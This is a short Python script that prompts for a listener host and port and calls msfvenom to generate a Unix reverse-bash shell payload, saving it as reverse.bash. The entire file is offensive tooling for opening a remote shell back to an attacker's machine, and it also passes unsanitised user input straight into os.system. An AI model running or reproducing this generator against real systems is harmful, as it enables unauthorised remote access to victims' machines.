import os
import subprocess

def clear():
    subprocess.call("clear")
class create:
    clear()
    f = input("add lhost=>")
    print(f)
    c = input("add lport =>")
    print(c)
    try:
        os.system("msfvenom -p cmd/unix/reverse_bash LHOST=" + f + " " + "LPORT=" + c + " " + "-f raw > reverse.bash")
    except KeyboardInterrupt:
        pass